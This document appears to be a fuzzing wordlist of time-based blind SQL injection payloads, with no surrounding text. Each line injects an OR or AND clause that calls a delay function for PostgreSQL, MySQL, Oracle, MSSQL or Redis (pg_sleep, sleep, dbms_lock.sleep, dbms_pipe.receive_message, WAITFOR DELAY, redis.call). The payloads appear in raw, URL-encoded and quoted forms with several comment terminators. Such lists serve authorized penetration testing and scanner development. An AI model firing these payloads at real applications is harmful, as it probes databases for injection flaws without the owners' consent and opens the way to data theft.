+%20OR%20%2Bdbms_lock.sleep%2825%29%2B%23
+' OR +dbms_lock.sleep(25)+#'
+ AND +dbms_lock.sleep(25)+#
+%20AND%20%2Bdbms_lock.sleep%2825%29%2B%23
+' AND +dbms_lock.sleep(25)+#'
+ AND AND dbms_lock.sleep(25) #
+%20AND%20AND%20dbms_lock.sleep%2825%29%20%23
++AND+AND+dbms_lock.sleep%2825%29+%23
+' AND AND dbms_lock.sleep(25) #'
+ OR OR dbms_lock.sleep(25) #
+%20OR%20OR%20dbms_lock.sleep%2825%29%20%23
++OR+OR+dbms_lock.sleep%2825%29+%23
+' OR OR dbms_lock.sleep(25) #'
+  AND dbms_lock.sleep(25)+#
+%20%20AND%20dbms_lock.sleep%2825%29%2B%23
+'  AND dbms_lock.sleep(25)+#'
+  OR dbms_lock.sleep(25)+#
+%20%20AND%20dbms_lock.sleep%2825%29%2B%23
+'  OR dbms_lock.sleep(25)+#'
+  AND dbms_lock.sleep(25) #
+%20%20AND%20dbms_lock.sleep%2825%29%20%23
+'  AND dbms_lock.sleep(25) #'
+  OR dbms_lock.sleep(25) #
+%20%20OR%20dbms_lock.sleep%2825%29%20%23
+'  OR dbms_lock.sleep(25) #'
+  redis.call("TIME")[25] #
+%20%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+++redis.call%28%22TIME%22%29%5B25%5D+%23
+'  redis.call("TIME")[25] #'
+ +redis.call("TIME")[25]+#
+%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' +redis.call("TIME")[25]+#'
+ OR +redis.call("TIME")[25]+#
+%20OR%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' OR +redis.call("TIME")[25]+#'
+ AND +redis.call("TIME")[25]+#
+%20AND%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' AND +redis.call("TIME")[25]+#'
+ AND AND redis.call("TIME")[25] #
+%20AND%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++AND+AND+redis.call%28%22TIME%22%29%5B25%5D+%23
+' AND AND redis.call("TIME")[25] #'
+ OR OR redis.call("TIME")[25] #
+%20OR%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++OR+OR+redis.call%28%22TIME%22%29%5B25%5D+%23
+' OR OR redis.call("TIME")[25] #'
+  AND redis.call("TIME")[25]+#
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'  AND redis.call("TIME")[25]+#'
+  OR redis.call("TIME")[25]+#
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'  OR redis.call("TIME")[25]+#'
+  AND redis.call("TIME")[25] #
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'  AND redis.call("TIME")[25] #'
+  OR redis.call("TIME")[25] #
+%20%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'  OR redis.call("TIME")[25] #'
+  WAITFOR DELAY '00:00:25' #
+%20%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+++WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+"  WAITFOR DELAY '00:00:25' #"
+ +WAITFOR DELAY '00:00:25'+#
+%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" +WAITFOR DELAY '00:00:25'+#"
+ OR +WAITFOR DELAY '00:00:25'+#
+%20OR%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" OR +WAITFOR DELAY '00:00:25'+#"
+ AND +WAITFOR DELAY '00:00:25'+#
+%20AND%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" AND +WAITFOR DELAY '00:00:25'+#"
+ AND AND WAITFOR DELAY '00:00:25' #
+%20AND%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++AND+AND+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+" AND AND WAITFOR DELAY '00:00:25' #"
+ OR OR WAITFOR DELAY '00:00:25' #
+%20OR%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++OR+OR+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+" OR OR WAITFOR DELAY '00:00:25' #"
+  AND WAITFOR DELAY '00:00:25'+#
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"  AND WAITFOR DELAY '00:00:25'+#"
+  OR WAITFOR DELAY '00:00:25'+#
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"  OR WAITFOR DELAY '00:00:25'+#"
+  AND WAITFOR DELAY '00:00:25' #
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+"  AND WAITFOR DELAY '00:00:25' #"
+  OR WAITFOR DELAY '00:00:25' #
+%20%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+"  OR WAITFOR DELAY '00:00:25' #"
+  pg_sleep(25) /**/
+%20%20pg_sleep%2825%29%20/%2A%2A/
+++pg_sleep%2825%29+%2F%2A%2A%2F
+'  pg_sleep(25) /**/'
+ +pg_sleep(25)+/**/
+%20%2Bpg_sleep%2825%29%2B/%2A%2A/
+' +pg_sleep(25)+/**/'
+ OR +pg_sleep(25)+/**/
+%20OR%20%2Bpg_sleep%2825%29%2B/%2A%2A/
+' OR +pg_sleep(25)+/**/'
+ AND +pg_sleep(25)+/**/
+%20AND%20%2Bpg_sleep%2825%29%2B/%2A%2A/
+' AND +pg_sleep(25)+/**/'
+ AND AND pg_sleep(25) /**/
+%20AND%20AND%20pg_sleep%2825%29%20/%2A%2A/
++AND+AND+pg_sleep%2825%29+%2F%2A%2A%2F
+' AND AND pg_sleep(25) /**/'
+ OR OR pg_sleep(25) /**/
+%20OR%20OR%20pg_sleep%2825%29%20/%2A%2A/
++OR+OR+pg_sleep%2825%29+%2F%2A%2A%2F
+' OR OR pg_sleep(25) /**/'
+  AND pg_sleep(25)+/**/
+%20%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+'  AND pg_sleep(25)+/**/'
+  OR pg_sleep(25)+/**/
+%20%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+'  OR pg_sleep(25)+/**/'
+  AND pg_sleep(25) /**/
+%20%20AND%20pg_sleep%2825%29%20/%2A%2A/
+'  AND pg_sleep(25) /**/'
+  OR pg_sleep(25) /**/
+%20%20OR%20pg_sleep%2825%29%20/%2A%2A/
+'  OR pg_sleep(25) /**/'
+  dbms_pipe.receive_message(('a'),25) /**/
+%20%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+++dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+"  dbms_pipe.receive_message(('a'),25) /**/"
+ +dbms_pipe.receive_message(('a'),25)+/**/
+%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" +dbms_pipe.receive_message(('a'),25)+/**/"
+ OR +dbms_pipe.receive_message(('a'),25)+/**/
+%20OR%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" OR +dbms_pipe.receive_message(('a'),25)+/**/"
+ AND +dbms_pipe.receive_message(('a'),25)+/**/
+%20AND%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" AND +dbms_pipe.receive_message(('a'),25)+/**/"
+ AND AND dbms_pipe.receive_message(('a'),25) /**/
+%20AND%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++AND+AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+" AND AND dbms_pipe.receive_message(('a'),25) /**/"
+ OR OR dbms_pipe.receive_message(('a'),25) /**/
+%20OR%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++OR+OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+" OR OR dbms_pipe.receive_message(('a'),25) /**/"
+  AND dbms_pipe.receive_message(('a'),25)+/**/
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"  AND dbms_pipe.receive_message(('a'),25)+/**/"
+  OR dbms_pipe.receive_message(('a'),25)+/**/
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"  OR dbms_pipe.receive_message(('a'),25)+/**/"
+  AND dbms_pipe.receive_message(('a'),25) /**/
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+"  AND dbms_pipe.receive_message(('a'),25) /**/"
+  OR dbms_pipe.receive_message(('a'),25) /**/
+%20%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+"  OR dbms_pipe.receive_message(('a'),25) /**/"
+  sleep(25) /**/
+%20%20sleep%2825%29%20/%2A%2A/
+++sleep%2825%29+%2F%2A%2A%2F
+'  sleep(25) /**/'
+ +sleep(25)+/**/
+%20%2Bsleep%2825%29%2B/%2A%2A/
+' +sleep(25)+/**/'
+ OR +sleep(25)+/**/
+%20OR%20%2Bsleep%2825%29%2B/%2A%2A/
+' OR +sleep(25)+/**/'
+ AND +sleep(25)+/**/
+%20AND%20%2Bsleep%2825%29%2B/%2A%2A/
+' AND +sleep(25)+/**/'
+ AND AND sleep(25) /**/
+%20AND%20AND%20sleep%2825%29%20/%2A%2A/
++AND+AND+sleep%2825%29+%2F%2A%2A%2F
+' AND AND sleep(25) /**/'
+ OR OR sleep(25) /**/
+%20OR%20OR%20sleep%2825%29%20/%2A%2A/
++OR+OR+sleep%2825%29+%2F%2A%2A%2F
+' OR OR sleep(25) /**/'
+  AND sleep(25)+/**/
+%20%20AND%20sleep%2825%29%2B/%2A%2A/
+'  AND sleep(25)+/**/'
+  OR sleep(25)+/**/
+%20%20AND%20sleep%2825%29%2B/%2A%2A/
+'  OR sleep(25)+/**/'
+  AND sleep(25) /**/
+%20%20AND%20sleep%2825%29%20/%2A%2A/
+'  AND sleep(25) /**/'
+  OR sleep(25) /**/
+%20%20OR%20sleep%2825%29%20/%2A%2A/
+'  OR sleep(25) /**/'
+  dbms_lock.sleep(25) /**/
+%20%20dbms_lock.sleep%2825%29%20/%2A%2A/
+++dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+'  dbms_lock.sleep(25) /**/'
+ +dbms_lock.sleep(25)+/**/
+%20%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' +dbms_lock.sleep(25)+/**/'
+ OR +dbms_lock.sleep(25)+/**/
+%20OR%20%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' OR +dbms_lock.sleep(25)+/**/'
+ AND +dbms_lock.sleep(25)+/**/
+%20AND%20%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' AND +dbms_lock.sleep(25)+/**/'
+ AND AND dbms_lock.sleep(25) /**/
+%20AND%20AND%20dbms_lock.sleep%2825%29%20/%2A%2A/
++AND+AND+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+' AND AND dbms_lock.sleep(25) /**/'
+ OR OR dbms_lock.sleep(25) /**/
+%20OR%20OR%20dbms_lock.sleep%2825%29%20/%2A%2A/
++OR+OR+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+' OR OR dbms_lock.sleep(25) /**/'
+  AND dbms_lock.sleep(25)+/**/
+%20%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+'  AND dbms_lock.sleep(25)+/**/'
+  OR dbms_lock.sleep(25)+/**/
+%20%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+'  OR dbms_lock.sleep(25)+/**/'
+  AND dbms_lock.sleep(25) /**/
+%20%20AND%20dbms_lock.sleep%2825%29%20/%2A%2A/
+'  AND dbms_lock.sleep(25) /**/'
+  OR dbms_lock.sleep(25) /**/
+%20%20OR%20dbms_lock.sleep%2825%29%20/%2A%2A/
+'  OR dbms_lock.sleep(25) /**/'
+  redis.call("TIME")[25] /**/
+%20%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+++redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+'  redis.call("TIME")[25] /**/'
+ +redis.call("TIME")[25]+/**/
+%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' +redis.call("TIME")[25]+/**/'
+ OR +redis.call("TIME")[25]+/**/
+%20OR%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' OR +redis.call("TIME")[25]+/**/'
+ AND +redis.call("TIME")[25]+/**/
+%20AND%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' AND +redis.call("TIME")[25]+/**/'
+ AND AND redis.call("TIME")[25] /**/
+%20AND%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++AND+AND+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' AND AND redis.call("TIME")[25] /**/'
+ OR OR redis.call("TIME")[25] /**/
+%20OR%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++OR+OR+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' OR OR redis.call("TIME")[25] /**/'
+  AND redis.call("TIME")[25]+/**/
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'  AND redis.call("TIME")[25]+/**/'
+  OR redis.call("TIME")[25]+/**/
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'  OR redis.call("TIME")[25]+/**/'
+  AND redis.call("TIME")[25] /**/
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'  AND redis.call("TIME")[25] /**/'
+  OR redis.call("TIME")[25] /**/
+%20%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'  OR redis.call("TIME")[25] /**/'
+  WAITFOR DELAY '00:00:25' /**/
+%20%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+++WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+"  WAITFOR DELAY '00:00:25' /**/"
+ +WAITFOR DELAY '00:00:25'+/**/
+%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" +WAITFOR DELAY '00:00:25'+/**/"
+ OR +WAITFOR DELAY '00:00:25'+/**/
+%20OR%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" OR +WAITFOR DELAY '00:00:25'+/**/"
+ AND +WAITFOR DELAY '00:00:25'+/**/
+%20AND%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" AND +WAITFOR DELAY '00:00:25'+/**/"
+ AND AND WAITFOR DELAY '00:00:25' /**/
+%20AND%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++AND+AND+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+" AND AND WAITFOR DELAY '00:00:25' /**/"
+ OR OR WAITFOR DELAY '00:00:25' /**/
+%20OR%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++OR+OR+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+" OR OR WAITFOR DELAY '00:00:25' /**/"
+  AND WAITFOR DELAY '00:00:25'+/**/
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"  AND WAITFOR DELAY '00:00:25'+/**/"
+  OR WAITFOR DELAY '00:00:25'+/**/
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"  OR WAITFOR DELAY '00:00:25'+/**/"
+  AND WAITFOR DELAY '00:00:25' /**/
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+"  AND WAITFOR DELAY '00:00:25' /**/"
+  OR WAITFOR DELAY '00:00:25' /**/
+%20%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+"  OR WAITFOR DELAY '00:00:25' /**/"
+  pg_sleep(25) -- -
+%20%20pg_sleep%2825%29%20--%20-
+++pg_sleep%2825%29+--+-
+'  pg_sleep(25) -- -'
+ +pg_sleep(25)+-- -
+%20%2Bpg_sleep%2825%29%2B--%20-
+' +pg_sleep(25)+-- -'
+ OR +pg_sleep(25)+-- -
+%20OR%20%2Bpg_sleep%2825%29%2B--%20-
+' OR +pg_sleep(25)+-- -'
+ AND +pg_sleep(25)+-- -
+%20AND%20%2Bpg_sleep%2825%29%2B--%20-
+' AND +pg_sleep(25)+-- -'
+ AND AND pg_sleep(25) -- -
+%20AND%20AND%20pg_sleep%2825%29%20--%20-
++AND+AND+pg_sleep%2825%29+--+-
+' AND AND pg_sleep(25) -- -'
+ OR OR pg_sleep(25) -- -
+%20OR%20OR%20pg_sleep%2825%29%20--%20-
++OR+OR+pg_sleep%2825%29+--+-
+' OR OR pg_sleep(25) -- -'
+  AND pg_sleep(25)+-- -
+%20%20AND%20pg_sleep%2825%29%2B--%20-
+'  AND pg_sleep(25)+-- -'
+  OR pg_sleep(25)+-- -
+%20%20AND%20pg_sleep%2825%29%2B--%20-
+'  OR pg_sleep(25)+-- -'
+  AND pg_sleep(25) -- -
+%20%20AND%20pg_sleep%2825%29%20--%20-
+'  AND pg_sleep(25) -- -'
+  OR pg_sleep(25) -- -
+%20%20OR%20pg_sleep%2825%29%20--%20-
+'  OR pg_sleep(25) -- -'
+  dbms_pipe.receive_message(('a'),25) -- -
+%20%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+++dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+"  dbms_pipe.receive_message(('a'),25) -- -"
+ +dbms_pipe.receive_message(('a'),25)+-- -
+%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" +dbms_pipe.receive_message(('a'),25)+-- -"
+ OR +dbms_pipe.receive_message(('a'),25)+-- -
+%20OR%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" OR +dbms_pipe.receive_message(('a'),25)+-- -"
+ AND +dbms_pipe.receive_message(('a'),25)+-- -
+%20AND%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" AND +dbms_pipe.receive_message(('a'),25)+-- -"
+ AND AND dbms_pipe.receive_message(('a'),25) -- -
+%20AND%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++AND+AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+" AND AND dbms_pipe.receive_message(('a'),25) -- -"
+ OR OR dbms_pipe.receive_message(('a'),25) -- -
+%20OR%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++OR+OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+" OR OR dbms_pipe.receive_message(('a'),25) -- -"
+  AND dbms_pipe.receive_message(('a'),25)+-- -
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"  AND dbms_pipe.receive_message(('a'),25)+-- -"
+  OR dbms_pipe.receive_message(('a'),25)+-- -
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"  OR dbms_pipe.receive_message(('a'),25)+-- -"
+  AND dbms_pipe.receive_message(('a'),25) -- -
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+"  AND dbms_pipe.receive_message(('a'),25) -- -"
+  OR dbms_pipe.receive_message(('a'),25) -- -
+%20%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+"  OR dbms_pipe.receive_message(('a'),25) -- -"
+  sleep(25) -- -
+%20%20sleep%2825%29%20--%20-
+++sleep%2825%29+--+-
+'  sleep(25) -- -'
+ +sleep(25)+-- -
+%20%2Bsleep%2825%29%2B--%20-
+' +sleep(25)+-- -'
+ OR +sleep(25)+-- -
+%20OR%20%2Bsleep%2825%29%2B--%20-
+' OR +sleep(25)+-- -'
+ AND +sleep(25)+-- -
+%20AND%20%2Bsleep%2825%29%2B--%20-
+' AND +sleep(25)+-- -'
+ AND AND sleep(25) -- -
+%20AND%20AND%20sleep%2825%29%20--%20-
++AND+AND+sleep%2825%29+--+-
+' AND AND sleep(25) -- -'
+ OR OR sleep(25) -- -
+%20OR%20OR%20sleep%2825%29%20--%20-
++OR+OR+sleep%2825%29+--+-
+' OR OR sleep(25) -- -'
+  AND sleep(25)+-- -
+%20%20AND%20sleep%2825%29%2B--%20-
+'  AND sleep(25)+-- -'
+  OR sleep(25)+-- -
+%20%20AND%20sleep%2825%29%2B--%20-
+'  OR sleep(25)+-- -'
+  AND sleep(25) -- -
+%20%20AND%20sleep%2825%29%20--%20-
+'  AND sleep(25) -- -'
+  OR sleep(25) -- -
+%20%20OR%20sleep%2825%29%20--%20-
+'  OR sleep(25) -- -'
+  dbms_lock.sleep(25) -- -
+%20%20dbms_lock.sleep%2825%29%20--%20-
+++dbms_lock.sleep%2825%29+--+-
+'  dbms_lock.sleep(25) -- -'
+ +dbms_lock.sleep(25)+-- -
+%20%2Bdbms_lock.sleep%2825%29%2B--%20-
+' +dbms_lock.sleep(25)+-- -'
+ OR +dbms_lock.sleep(25)+-- -
+%20OR%20%2Bdbms_lock.sleep%2825%29%2B--%20-
+' OR +dbms_lock.sleep(25)+-- -'
+ AND +dbms_lock.sleep(25)+-- -
+%20AND%20%2Bdbms_lock.sleep%2825%29%2B--%20-
+' AND +dbms_lock.sleep(25)+-- -'
+ AND AND dbms_lock.sleep(25) -- -
+%20AND%20AND%20dbms_lock.sleep%2825%29%20--%20-
++AND+AND+dbms_lock.sleep%2825%29+--+-
+' AND AND dbms_lock.sleep(25) -- -'
+ OR OR dbms_lock.sleep(25) -- -
+%20OR%20OR%20dbms_lock.sleep%2825%29%20--%20-
++OR+OR+dbms_lock.sleep%2825%29+--+-
+' OR OR dbms_lock.sleep(25) -- -'
+  AND dbms_lock.sleep(25)+-- -
+%20%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+'  AND dbms_lock.sleep(25)+-- -'
+  OR dbms_lock.sleep(25)+-- -
+%20%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+'  OR dbms_lock.sleep(25)+-- -'
+  AND dbms_lock.sleep(25) -- -
+%20%20AND%20dbms_lock.sleep%2825%29%20--%20-
+'  AND dbms_lock.sleep(25) -- -'
+  OR dbms_lock.sleep(25) -- -
+%20%20OR%20dbms_lock.sleep%2825%29%20--%20-
+'  OR dbms_lock.sleep(25) -- -'
+  redis.call("TIME")[25] -- -
+%20%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+++redis.call%28%22TIME%22%29%5B25%5D+--+-
+'  redis.call("TIME")[25] -- -'
+ +redis.call("TIME")[25]+-- -
+%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' +redis.call("TIME")[25]+-- -'
+ OR +redis.call("TIME")[25]+-- -
+%20OR%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' OR +redis.call("TIME")[25]+-- -'
+ AND +redis.call("TIME")[25]+-- -
+%20AND%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' AND +redis.call("TIME")[25]+-- -'
+ AND AND redis.call("TIME")[25] -- -
+%20AND%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++AND+AND+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' AND AND redis.call("TIME")[25] -- -'
+ OR OR redis.call("TIME")[25] -- -
+%20OR%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++OR+OR+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' OR OR redis.call("TIME")[25] -- -'
+  AND redis.call("TIME")[25]+-- -
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'  AND redis.call("TIME")[25]+-- -'
+  OR redis.call("TIME")[25]+-- -
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'  OR redis.call("TIME")[25]+-- -'
+  AND redis.call("TIME")[25] -- -
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'  AND redis.call("TIME")[25] -- -'
+  OR redis.call("TIME")[25] -- -
+%20%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'  OR redis.call("TIME")[25] -- -'
+  WAITFOR DELAY '00:00:25' -- -
+%20%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+++WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+"  WAITFOR DELAY '00:00:25' -- -"
+ +WAITFOR DELAY '00:00:25'+-- -
+%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" +WAITFOR DELAY '00:00:25'+-- -"
+ OR +WAITFOR DELAY '00:00:25'+-- -
+%20OR%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" OR +WAITFOR DELAY '00:00:25'+-- -"
+ AND +WAITFOR DELAY '00:00:25'+-- -
+%20AND%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" AND +WAITFOR DELAY '00:00:25'+-- -"
+ AND AND WAITFOR DELAY '00:00:25' -- -
+%20AND%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++AND+AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+" AND AND WAITFOR DELAY '00:00:25' -- -"
+ OR OR WAITFOR DELAY '00:00:25' -- -
+%20OR%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++OR+OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+" OR OR WAITFOR DELAY '00:00:25' -- -"
+  AND WAITFOR DELAY '00:00:25'+-- -
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"  AND WAITFOR DELAY '00:00:25'+-- -"
+  OR WAITFOR DELAY '00:00:25'+-- -
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"  OR WAITFOR DELAY '00:00:25'+-- -"
+  AND WAITFOR DELAY '00:00:25' -- -
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+"  AND WAITFOR DELAY '00:00:25' -- -"
+  OR WAITFOR DELAY '00:00:25' -- -
+%20%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+"  OR WAITFOR DELAY '00:00:25' -- -"
